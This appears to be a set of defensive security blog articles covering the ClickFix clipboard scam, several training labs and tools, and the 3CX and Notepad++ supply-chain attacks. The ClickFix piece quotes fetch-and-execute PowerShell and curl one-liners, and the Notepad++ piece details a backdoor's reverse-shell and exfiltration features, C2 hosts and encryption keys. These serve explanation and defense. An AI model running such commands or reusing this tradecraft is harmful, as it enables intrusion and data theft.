title: ClickFix: The Clipboard Scam That Makes the User Run Its Own Malware
summary: A technical breakdown of the ClickFix attack, where hidden clipboard commands and fake verification prompts trick victims into pasting malicious shell commands and executing staged malware.
content:
ClickFix: The Clipboard Scam That Makes the User Run Its Own Malware

ClickFix is not a traditional exploit. It is a social engineering technique that weaponizes the browser, the clipboard, and user helpfulness. The attacker doesn’t need a zero-day or an attachment. They only need a convincingly broken page, a hidden clipboard write, and a prompt that tells the victim to paste and execute a command.

1 — How ClickFix Works

The attack flow is surprisingly simple:

  1. A victim lands on a malicious page disguised as a verification flow, CAPTCHA, or troubleshooting wizard.
  2. Hidden JavaScript copies a malicious shell command directly to the victim’s clipboard.
  3. The page then instructs the victim to press a key combo, paste the command, and hit Enter.
  4. The victim complies, running a command in Run, Windows Terminal, PowerShell, or another shell.
  5. The pasted command downloads and executes a second-stage payload from a remote server.

Because the victim manually pastes and runs the command, ClickFix effectively turns the user into the attack vector. The web page is the lure, and the clipboard is the delivery mechanism.

2 — The Core Technical Trick

At the heart of ClickFix is clipboard abuse. Modern browsers allow pages to write to the clipboard using APIs such as navigator.clipboard.writeText() or older clipboard-copy techniques. In the wild, attackers hide this behavior behind a fake button or a deceptive prompt.

The result is twofold:

  • The command never arrives as a file attachment. That makes the initial stage much harder to detect with traditional AV and email gateways.
  • The browser itself appears innocent. No malicious binary is downloaded until the user pastes and runs the command.

Sample workflow

Typical ClickFix content asks the user to:

  • press Windows+R and paste into the Run dialog, or
  • open Windows Terminal with Windows+X and paste there.

Recent variants prefer Terminal because it looks more ordinary and avoids leaving traces in the Windows RunMRU registry. This is a clear escalation from earlier campaigns.

3 — What the Clipboard Command Actually Does

The copied command is usually not a simple download. In observed cases, it is a multi-stage, obfuscated command designed to evade scanners and execution policy checks.

Examples of the command style include:

  • powershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand ...
  • cmd.exe /c "echo ...|powershell -NoProfile ..."
  • curl https://trustedcdn.com/payload | iex

These commands are often wrapped in Base64, AES, or other encoding layers. The landing page's JavaScript can even build the command dynamically, selecting different payload URLs based on the victim’s browser or geography.

4 — Why ClickFix Is Effective

ClickFix bypasses many common defenses because it exploits human behavior and trusted infrastructure rather than technical weaknesses in the endpoint:

  • No file attachment for email filters to scan.
  • No direct exploit or zero-day vulnerability.
  • Trusted delivery via a legitimate browser session.
  • Human execution makes the victim do the malicious work.
  • Command obfuscation reduces signature visibility.

That combination makes ClickFix a very low-cost, high-success attack for threat actors.

5 — Variants and Evolution

ClickFix has spawned several variants that adjust the execution path:

  • FileFix — instead of Run or Terminal, the page opens a file chooser and tricks the user into pasting a command into the Windows Explorer address bar.
  • TerminalFix — the page guides the victim into Windows Terminal or another shell, which is harder to detect than the Run box.
  • DownloadFix — the page tricks the victim into downloading a file and then executing it from a trusted location.

These variants all preserve the same core idea: get the victim to paste and execute a command from the clipboard.

6 — What Happens After Paste

Once the clipboard command runs, the secondary stage usually performs one of these actions:

  • download an installer or script from a trusted CDN
  • launch a PowerShell runspace in memory
  • decrypt and execute a payload with an in-memory loader
  • deploy a remote access trojan or data stealer

Research on live campaigns shows that attackers rotate payload wrappers and use encrypted command generation services. One researcher found hundreds of unique ClickFix payloads delivered from API-driven platforms, all of them ultimately executing a similar in-memory loader.

7 — Detection and Defense

Defending against ClickFix requires shifting from file-based detection to behavior and control flow awareness.

Browser / web layer

  • block or warn on suspicious clipboard writes from untrusted pages
  • detect fake verification flows that ask for shell command pasting
  • use browser isolation for unknown links and prompts

Endpoint layer

  • monitor PowerShell and terminal launches immediately after clipboard paste
  • alert on Run or terminal executions that contain encoded commands
  • use AppLocker / WDAC to prevent unauthorized scripts from running
  • log ShellExecute calls from browser processes

User layer

  • train users: never paste commands from a web page into a shell
  • treat any “help me fix this” prompt as suspicious
  • verify unexpected support instructions with IT before taking action

The Bottom Line

ClickFix is a reminder that the attack surface is not only code and network traffic — it is also the user interface. When attackers can convince someone to paste and execute a command, they have bypassed many of the protections we rely on.

The strongest defense is simple: remove the habit of executing clipboard commands from web pages, and treat any page that asks for it as malicious. The rest is a matter of endpoint visibility and behavioral controls.

Sources: Check Point threat research, Huntress analysis, The Hacker News investigation of live ClickFix payloads, and public reporting on evolving clipboard-based malware campaigns.

title: RedPawn Lab: My Analysis and Emulation Environment
summary: Overview of the RedPawn lab, its infrastructure, attack scenarios, and detection exercises I built for practical CTI and pentest training.
content:
RedPawn Lab: My Analysis and Emulation Environment

The RedPawn lab is designed as a realistic testing platform for intrusion scenarios, threat analysis and detection. Rather than a simple testbed, it is structured as a small adversary-versus-defender operations center with machines, services and logs that replicate a targeted enterprise environment.

1 — Lab Architecture

The core of the lab relies on a few key elements:

  • An Active Directory zone to simulate user authentication and group policies.
  • Network service servers (DNS, web, mail, VPN) that provide plausible targets for phishing campaigns and pivoting.
  • A SOC workstation with log collection tools, Sigma alerts and dashboards.
  • User workstations with realistic Windows and Linux configurations.

2 — Educational Objectives

The lab serves three main goals:

  • Adversary emulation — reproduce TTPs to understand the attack path.
  • Detection — test correlation rules, behavioral signatures and log pipelines.
  • Remediation — evaluate incident response procedures and mitigations.

These objectives turn hypotheses into operational evidence: you don’t just read a report, you see how an intrusion unfolds and how it is detected.

3 — Integrated Scenarios

I integrated several scenarios into RedPawn:

  • Initial compromise via a targeted phishing campaign.
  • Privilege escalation through service exploitation and secret harvesting.
  • Lateral movement across the internal network and data exfiltration.
  • Command-and-control pipeline using common post-exploitation tools.

Each scenario includes a set of observable artifacts: security events, network connections, and modified configuration files.

4 — What I Learned

This lab improved my understanding of building a credible infrastructure and the common weak points in attack paths. The most instructive part is often log analysis: an anomalous DNS behavior or an unusual remote access to WSUS can provide very practical signals.

5 — Why It’s Useful

RedPawn is not just a training tool; it is a research asset. It facilitates writing CTI reports, extracting indicators of compromise, and validating detection hypotheses before deploying them to a real SOC.

6 — Quick Start

The project sets up easily:

  • chmod +x scripts/setup.sh
  • ./scripts/run.sh list-scenarios
  • ./scripts/run_web.sh then open http://127.0.0.1:5000

RedPawn is intended to be autonomous, reproducible and accessible to organizations seeking to strengthen resilience without relying on the cloud.

GitHub: https://github.com/Roockbye/Lab-RedPawn

title: Mission Blackout: An Offline Cyberlab for Low-Connectivity Regions
summary: Overview of Mission Blackout, a mobile, fully offline cyberlab that lets local teams train for cyber crises without relying on the Internet.
content:
Mission Blackout: An Offline Cyberlab for Low-Connectivity Regions

Mission Blackout is a crisis-oriented cybersecurity lab designed for local authorities and IT teams without permanent Internet access. The project provides a 100% offline environment, with paper-based scenarios and a local digital version, to train decision-making, coordination and operational response to real incidents.

The project is still actively being developed and expanded, with new scenarios and features being added over time.

1 — A Two-Mode Approach

The lab operates in two complementary modes:

  • Fully paper-based mode — scenario cards, printed roles and whiteboards to simulate a crisis without technology.
  • Isolated digital mode — local web interface and CLI on an isolated network with no external connections.

This dual approach makes Mission Blackout usable in meeting rooms, technical centers or regions where Internet access is limited or unavailable.

2 — Project Architecture

Mission Blackout relies on a lightweight, modular structure:

  • tools/ — scenario engine, Pydantic validation, CLI runner and Flask web app.
  • scenarios/ — JSON scenarios defining crises, objectives and steps.
  • tests/ — unit tests to ensure scenario reliability.
  • docs/ — user guides, admin guide and technical architecture.

3 — Realistic Collaborative Scenarios

Mission Blackout offers crises tailored to local authorities:

  • Lost key = data leak — a simple scenario highlighting data leak handling.
  • Fire = ransomware — an intermediate crisis combining hardware fire and software compromise.
  • Phishing — a detection and response exercise for a targeted phishing campaign.
  • DDoS — a challenging scenario focusing on availability and continuity of service.
  • Combined crisis — a sequence of incidents that stresses coordination between IT, security and leadership.

4 — What the Lab Delivers

Mission Blackout addresses a common problem: lack of coordinated operational preparedness. By simulating a crisis it enables work on:

  • rapid communication between stakeholders,
  • decision-making under constraints,
  • prioritization,
  • post-incident reporting,
  • learning by action rather than theory.

5 — Why It Matters

This project is especially useful for teams that must train in critical or disconnected environments. It offers an immersive experience without cloud dependence while providing a modern digital interface and automated reports.

6 — Quick Start

The project is easy to deploy:

  • chmod +x scripts/setup.sh
  • ./scripts/run.sh list-scenarios
  • ./scripts/run_web.sh then open http://127.0.0.1:5000

Mission Blackout is designed to be autonomous, reproducible and accessible to organizations seeking to strengthen resilience without relying on the cloud.

GitHub: https://github.com/Roockbye/Mission-Blackout

title: Phishing Detection Tool: A Python Toolkit to Analyze Suspicious Emails, URLs and Domains
summary: An article presenting the Phishing Detection Tool project: its Python architecture and capabilities for analyzing emails, URLs, patterns and reputation.
content:
Phishing Detection Tool: A Python Toolkit to Analyze Suspicious Emails, URLs and Domains

Phishing Detection Tool is a Python project designed to analyze emails and URLs to detect signs of phishing. It combines content analysis, pattern detection, reputation checks and WHOIS lookups behind a simple CLI interface.

1 — What It Does

The project covers several key use cases:

  • Email analysis — header extraction, content analysis and phishing indicator detection.
  • URL analysis — detection of suspicious domains, redirections and fraudulent patterns.
  • Pattern detection — identification of urgent language, requests for sensitive data, and spoofed sender names.
  • Reputation checks — lookups against known phishing blacklists.
  • WHOIS — domain registration research.

2 — Project Architecture

The project structure reflects a clear organization for a security tool:

  • src/phishing_detector — business logic for email, URL, pattern, reputation and WHOIS analysis.
  • tests — unit tests covering analyzers, CLI and validators.
  • data — example legitimate and phishing emails for testing.
  • docs and CLI guides — usage documentation and command examples.

3 — Why This Project Is Useful

This tool is valuable for analysts, SOC teams and researchers who need a local, extensible framework to evaluate phishing campaigns. It also serves as a foundation for automating email analysis or enriching detection pipelines.

4 — Quick Usage

Key commands:

  • python -m phishing_detector url https://suspicious-domain.tk
  • python -m phishing_detector email email.txt
  • python -m phishing_detector domain suspicious-domain.tk
  • python -m phishing_detector pattern 'Urgent! Verify your account now!'
  • python -m phishing_detector whois example.com

5 — What Makes It Robust

Phishing Detection Tool stands out for:

  • Pydantic-based scenario validation,
  • a well-documented CLI,
  • unit tests covering core modules,
  • examples and clear documentation to get started quickly.

In short, it’s a solid Python project combining threat detection, automation and practical support for phishing analysis.

GitHub: https://github.com/Roockbye/Phishing-Detection-tool

title: DFEPR: Digital Forensics Evidence Preservation & Recovery Lab
summary: Introducing DFEPR, an open-source forensics lab for disk imaging, deleted file recovery, and ACPO-compliant reporting.
content:
DFEPR: Digital Forensics Evidence Preservation & Recovery Lab

DFEPR is a digital forensics lab designed to simulate legal investigations and provide a full chain of custody, from disk imaging to generation of court-admissible reports.

1 — A Structured Approach to Digital Evidence

The project rests on four pillars:

  • secure acquisition using ddrescue with MD5/SHA256 integrity verification,
  • documented chain of custody following ACPO guidelines,
  • deleted data recovery using The Sleuth Kit and open-source tools,
  • legal reporting producing PDF reports with executive summary, methodology, appendices and cryptographic hashes.

2 — Infrastructure and Procedures

DFEPR organizes work around scripts and Python modules that automate:

  • raw image acquisition and bad-sector handling,
  • cryptographic validation of files and evidence,
  • deleted file recovery across NTFS, ext4, FAT32 and other filesystems,
  • generation of structured reports with executive summary and chain-of-custody documentation.

3 — Use Cases

The project serves both as an educational tool and a practical demonstrator:

  • test legally compliant investigation scenarios,
  • learn how to preserve evidence integrity,
  • document every action to support court admissibility,
  • compare acquisition, verification and recovery methods across systems.

4 — Tools and Compliance

DFEPR relies on an open-source toolchain while respecting legal standards:

  • ddrescue for resilient imaging,
  • The Sleuth Kit for filesystem analysis,
  • OpenSSL for cryptographic hashes,
  • ACPO for chain-of-custody procedures and evidence handling documentation.

5 — Quick Start

Key commands:

  • ./scripts/acquire_image.sh /dev/sdX /path/to/output.img
  • ./scripts/verify_integrity.sh /path/to/image.img
  • ./scripts/recover_deleted_files.sh /path/to/image.img /output/recovery/
  • python3 scripts/generate_report.py --case-id CASE_001 --output report.pdf

6 — Why It’s Useful

DFEPR is an ideal lab to learn digital forensics and apply reproducible methods. It bridges technical tools and legal requirements, making it a valuable learning resource for investigators, analysts and trainers.

GitHub: https://github.com/Roockbye/DFEPR

title: 3CX Supply Chain Attack: When a Trusted VoIP App Became the Delivery Vector
summary: A deep dive into the 3CX compromise, where attackers abused the vendor's official update channel to distribute a trojanized desktop application and turn a trusted productivity tool into a stealthy entry point.
content:
3CX Supply Chain Attack: When a Trusted VoIP App Became the Delivery Vector

The 3CX campaign is one of the clearest examples of how modern supply chain attacks work in practice. The attackers did not need to exploit a zero-day in Windows, bypass a strong perimeter, or invent a novel malware family. They exploited something more subtle and often more effective: the trust users place in a legitimate software update.

3CX is a widely used VoIP and collaboration platform. Many companies deploy it for internal communications, telephony, and remote work. That made the compromise especially valuable: the adversary did not need to convince users to install a strange executable from an unknown source. They simply abused the vendor's own update mechanism and delivered the payload through a trusted application.

1 — Why This Incident Mattered

What made the 3CX incident so important is that it exposed a basic weakness in the way many organizations think about software security. The usual mental model is: if it comes from the vendor, it is safe. In reality, that assumption only holds if the entire delivery chain is protected — from build to distribution to execution.

The attackers turned a normal software distribution workflow into an infection pipeline. In other words, they weaponized the trusted path instead of trying to bypass it.

2 — What Happened

Public reporting described a compromise where a malicious version of the 3CX desktop application was distributed through the official update channel. The application itself was not a random phishing attachment. It was a legitimate-looking product update, signed and delivered through a path that users and corporate systems routinely trust.

From a defender's standpoint, that is the real problem. The breach did not begin with a suspicious file. It began with a software update that looked completely ordinary.

The attack chain was simple, but effective

  1. Trusted delivery — the malicious app was distributed through the official 3CX update path.
  2. Execution on the endpoint — the trojanized desktop client was installed by users who believed they were updating a legitimate business tool.
  3. Second-stage payload — the initial implant acted as a loader or staging mechanism for additional malware or post-compromise actions.
  4. Credential and system abuse — the campaign then used the foothold to collect sensitive data, move laterally, or enable follow-on operations.

The important point is that the compromise did not rely on a flashy exploit. It relied on a very old and very effective principle in cyber operations: abuse trust, then let the victim do the rest.

3 — Why the Attack Was So Effective

A few characteristics made the campaign unusually dangerous.

It targeted the distribution layer

Many organizations focus heavily on source code, CI/CD pipelines, and end-point protection. The 3CX case showed that the distribution layer is just as important. If an attacker can compromise update delivery, they can bypass many of the assumptions built into traditional defense models.

It exploited software trust

Users and security tools are conditioned to trust signed binaries, official applications, and vendor updates. That trust is useful until it is weaponized. Once the attacker uses the vendor's own channel, the file becomes much harder to challenge at the point of delivery.

It had low operational friction

No one needed to build a complex phishing lure or rely on a highly specialized exploit. A compromised update path is scalable, low-cost, and difficult for organizations to detect in real time.

4 — What Security Teams Learned

From a CTI and blue-team perspective, the 3CX incident is a useful case study because it highlights a very practical lesson: code signing alone is not a guarantee of safety.

A signed binary can still be malicious if the trust chain is compromised earlier in the software lifecycle. In other words, signature verification only works when the client enforces it correctly and the delivery path itself is secure.

The key lesson

Defenders should treat update mechanisms as high-value attack surfaces. Auto-updaters, software agents, and business applications that silently install updates are effectively privileged launch points. If they are compromised, the attacker gains a very convenient path into the endpoint.

5 — Why It Was a Good Topic for a Class Presentation

This campaign is ideal for a course discussion because it combines several concepts at once:

  • Supply chain risk — the compromise happened before the software reached the user
  • Trust abuse — a legitimate product was used as the vehicle for infection
  • Detection blind spots — the malicious artifact looked like a normal update
  • Operational security — the attacker chose a path that maximized impact with minimal friction

It is also a strong reminder that the most dangerous attacks are not always the most technically flashy. Sometimes the most effective intrusion is the one that arrives wrapped in the appearance of normality.

6 — Defensive Takeaways

Organizations should treat the 3CX incident as a warning sign for several defensive priorities:

  • Harden the software update path — verify provenance, enforce signed manifests, and limit direct internet updates for critical tools
  • Monitor trusted binaries — suspicious process chains around desktop applications, update agents, and collaboration clients should be investigated quickly
  • Segment high-value workstations — if a trusted application is abused, the blast radius should be constrained
  • Review third-party software risk — voice, collaboration, and remote access tools are attractive targets precisely because they are so widely deployed
  • Use behavioral detection — the best signal may come from unusual network behavior, persistence, or sibling process activity rather than from a known malware signature

The Bottom Line

The 3CX attack is important because it illustrates a broader truth about modern cyber security: the most dangerous compromise is often not the one that breaks through the perimeter, but the one that arrives through a path the organization already trusts.

In that sense, the incident was not just about a malicious app. It was about the fragility of trust in software distribution. A single compromised update channel can turn a legitimate product into a delivery vehicle for a much larger intrusion.

Sources: public reporting from CISA, Microsoft, CrowdStrike, SentinelOne, and 3CX security advisories.

title: Notepad++ Hijacked: A Chinese APT's 6-Month Supply Chain Operation and the Chrysalis Backdoor
summary: Chinese state-sponsored hackers compromised Notepad++'s hosting provider to selectively redirect update traffic, deploying a previously undocumented backdoor called Chrysalis against telecom and financial targets for six months.
content:
Notepad++ Hijacked: A Chinese APT's 6-Month Supply Chain Operation and the Chrysalis Backdoor

On February 2, 2026, Notepad++ maintainer Dan Ho published a detailed post-mortem of one of the most surgically precise supply chain attacks in recent memory. A Chinese state-sponsored group compromised Notepad++'s hosting provider and, for six months, selectively redirected update traffic from targeted users to attacker-controlled servers delivering malicious payloads.

No source code was touched. No build pipeline was compromised. No signatures were broken. The attackers lived between the vendor and the endpoint — in the hosting infrastructure — and hand-delivered trojanized updates to a carefully chosen subset of victims.

This article covers the full timeline, the Chrysalis backdoor discovered by Rapid7, the attribution dispute, and the systemic lessons for software supply chain defense.

1 — Timeline: June to December 2025

Based on the combined analysis from the Notepad++ project, its former hosting provider, Rapid7, and independent researcher Kevin Beaumont:

DateEvent
June 2025Chinese APT gains access to the shared hosting server running notepad-plus-plus.org. They compromise the WinGUp update infrastructure.
June – Sept 2Attackers have full server access. They selectively intercept update traffic, redirecting targeted users to attacker-controlled servers that serve malicious update manifests and executables.
Sept 2, 2025Scheduled server maintenance updates kernel and firmware. Attackers lose direct server access.
Sept 2 – Dec 2Despite losing server access, attackers retain valid credentials for internal hosting services. They continue redirecting Notepad++ update traffic to malicious servers.
Nov 10, 2025Security experts assess the attack activity ceased operationally around this date.
Dec 2, 2025Hosting provider completes full credential rotation and vulnerability remediation. All attacker access is definitively terminated.
Feb 2, 2026Dan Ho publishes the full post-mortem. Rapid7 and Kaspersky publish technical analyses of the malware delivered via the compromised updater.

The key insight: the compromise lasted ~6 months, during which millions of Notepad++ users received clean updates while a small, strategically chosen subset received trojanized ones.

2 — How the Attack Worked

This was not a conventional software supply chain attack like SolarWinds or the XZ Utils backdoor. The attackers never touched Notepad++ source code or its build system. Instead, they operated entirely at the hosting infrastructure layer.

The Update Mechanism: WinGUp

Notepad++ uses WinGUp (Windows Generic Updater), a lightweight auto-update component. When Notepad++ checks for updates, WinGUp contacts notepad-plus-plus.org/update/getDownloadUrl.php to retrieve an update manifest — an XML file specifying the latest version and download URL.

The Interception

By compromising the shared hosting server, the attackers could:

  1. Monitor incoming update requests and filter by IP range or other targeting criteria
  2. Redirect selected requests to attacker-controlled servers serving malicious update manifests
  3. Serve trojanized binaries — the malicious manifest pointed WinGUp to download update.exe from 95.179.213.0 instead of the legitimate Notepad++ installer
  4. Leave all other users unaffected — non-targeted requests received the legitimate update as normal

This selectivity is what made the attack so difficult to detect. As Black Duck's Collin Hogue-Spears noted: "They lived inside the hosting provider for six months, filtered update requests by IP range, and hand-delivered trojanized installers to East Asian telecom and financial targets while millions of other users pulled clean copies."

Why Older WinGUp Was Vulnerable

Prior to version 8.8.9, WinGUp had insufficient update verification controls:

  • No cryptographic signature verification on downloaded binaries
  • No certificate validation on the update manifest
  • No signed update instructions (XMLDSig)

The updater simply downloaded whatever the server told it to download and executed it — a remote code execution pipeline disguised as a feature.

3 — The Chrysalis Backdoor

Rapid7's MDR team, led by malware analyst Ivan Feigl, conducted a deep forensic analysis of the malware delivered through the hijacked updater. They discovered a previously undocumented custom backdoor they named Chrysalis — a sophisticated, multi-layered implant designed for long-term espionage.

Delivery Chain

The infection follows a meticulous sequence:

  1. WinGUp downloads update.exe from 95.179.213.0
  2. update.exe is an NSIS installer (a tool commonly used by Chinese APTs) that drops three files into %AppData%\Bluetooth\:
    • BluetoothService.exe — a renamed legitimate Bitdefender Submission Wizard
    • log.dll — the malicious DLL
    • BluetoothService — encrypted shellcode
  3. The directory is set to HIDDEN
  4. BluetoothService.exe runs and sideloads log.dll via DLL sideloading
  5. log.dll loads and decrypts the shellcode using a linear congruential generator with custom stream cipher
  6. The decrypted shellcode is the Chrysalis backdoor

Chrysalis Capabilities

Chrysalis is a feature-rich, custom-built espionage tool with 16 command handlers:

CommandFunction
4TInteractive reverse shell (cmd.exe with UTF-8 encoding)
4VRemote process execution (CreateProcessW)
4W / 4XFile write (full and chunked)
4YFile read and exfiltration
4\Full self-uninstall (remove files, registry, services, self-deleting batch)
4]Sleep
4_ / 4`Drive and directory enumeration
4a – 4dFile management (delete, create dir, upload/download)

Key technical characteristics:

  • RC4 encryption for configuration (qwhvb^435h&*7) and C2 communication (vAuig34%^325hGV)
  • Custom API hashing using FNV-1a + MurmurHash-style finalization — different implementations in the loader vs. the main module
  • String obfuscation — DLL names reconstructed at runtime using position-dependent character encoding
  • Persistence via Windows service creation or registry Run key as fallback
  • Mutex Global\Jdhfv_1.0.1 for single-instance enforcement
  • C2: api.skycloudcenter.com over port 443, using a URL structure mimicking DeepSeek API chat endpoints to blend with legitimate traffic

Additional Tooling

Rapid7 also found Cobalt Strike beacons on the compromised host, loaded through a creative chain:

  • A renamed Tiny C Compiler (tcc.exe → svchost.exe) was used to compile and execute conf.c — a C source file containing Metasploit block_api shellcode that downloads a Cobalt Strike HTTPS beacon from api.wiresguard.com
  • The beacon configuration was XOR-encrypted with the key "CRAZY"
  • One loader variant (ConsoleApplication2.exe) abused Microsoft Warbird — an undocumented Windows code protection framework — to execute shellcode via NtQuerySystemInformation with the SystemCodeFlowTransition parameter, hiding execution inside a Microsoft-signed DLL (clipc.dll)

4 — Attribution: APT31 vs. Lotus Blossom

Two conflicting attributions have emerged, both pointing to Chinese state-sponsored actors:

Kevin Beaumont → Violet Typhoon (APT31 / Zirconium)

Independent researcher Kevin Beaumont, who first reported on the compromises, attributed the attack to Violet Typhoon (Microsoft's designation for APT31/Zirconium). His assessment was based on the targeting profile: financial services companies and telecom providers of strategic interest to China. APT31 is known for large-scale espionage operations targeting Western governments and critical infrastructure.

Rapid7 → Lotus Blossom

Rapid7's attribution to Lotus Blossom (active since 2009) is based on technical indicators:

  • The use of a renamed Bitdefender binary for DLL sideloading of log.dll matches previously documented Lotus Blossom TTPs (per Symantec/Broadcom research)
  • Shared Cobalt Strike public keys across multiple loader variants
  • Lotus Blossom's known focus on government, telecom, aviation, and media sectors in Southeast Asia and Central America

The discrepancy is not unusual — Chinese APT groups often share tooling, infrastructure, and even personnel. It's possible the operation involved collaboration between clusters, or that the tooling overlap simply makes clean attribution difficult.

5 — Why This Attack Is a Paradigm Shift

This incident invalidates several assumptions that underpin current software supply chain security models:

"We Secured the Build Pipeline"

Post-SolarWinds, the industry invested heavily in build pipeline integrity: reproducible builds, SLSA provenance, Sigstore signing. None of that helped here. The attackers didn't touch the source code, the CI/CD pipeline, or the release artifacts. They operated in the distribution layer — between the signed binary and the endpoint.

"The Binary Is Signed, So It's Safe"

The legitimate Notepad++ binary was properly signed. But WinGUp didn't verify the signature of downloaded updates. The attacker simply substituted a different binary at the HTTP level. Code signing is only useful if the client enforces verification.

"Auto-Updates Are a Security Feature"

As Hogue-Spears bluntly put it: "Auto-updaters are remote code execution pipelines." An update mechanism that downloads and executes binaries from the internet, with the same privileges as the application itself, is functionally equivalent to a backdoor — the only question is who controls it.

Selective Targeting Defeats Community Detection

Because millions of users received clean updates, crowd-sourced detection mechanisms (VirusTotal submissions, community bug reports) were ineffective. The poisoned updates went to a small number of high-value targets who may not have had the visibility to correlate their compromise with the update mechanism.

6 — Remediation and Hardening

What Notepad++ Did

  • Migrated to a new hosting provider with stronger security practices
  • WinGUp v8.8.9+ now verifies both the certificate and digital signature of downloaded installers
  • Update manifests are now signed using XMLDSig
  • v8.9.2 will strictly enforce all verification — the updater refuses anything that fails checks

What Organizations Should Do

The broader lessons, as outlined by BeyondTrust's Morey Haber and Black Duck's Hogue-Spears:

  • Kill direct-to-Internet updates for developer tools — force them through an internal repository that re-validates vendor code-signing certificates
  • Enforce cryptographic verification of all updates, including signed manifests and checksums
  • Vet the security practices of hosting and CDN providers — your supply chain extends to their infrastructure
  • Perform regular threat hunting around trusted processes (auto-updaters, plugin managers, package managers)
  • Monitor for anomalous child processes of updater binaries (e.g., GUP.exe spawning unknown executables)
  • Network-segment developer workstations — if an updater is compromised, limit what the attacker can reach
  • Inventory all auto-updater mechanisms across your fleet — each one is a potential RCE vector

7 — IOCs (Rapid7)

The Bottom Line

The Notepad++ hijack is a masterclass in what modern supply chain attacks look like. The attackers didn't need a zero-day, didn't need to compromise source code, and didn't need to break any cryptographic signatures. They compromised the space between the vendor and the user — the hosting infrastructure — and weaponized the implicit trust that auto-updaters place in their own distribution channel.

The software supply chain has three layers: code, build, and distribution. The industry has spent years hardening the first two. This attack proves the third is just as critical — and far less protected.

Update Notepad++ to v8.9.2 immediately. And then audit every other auto-updater on your fleet.
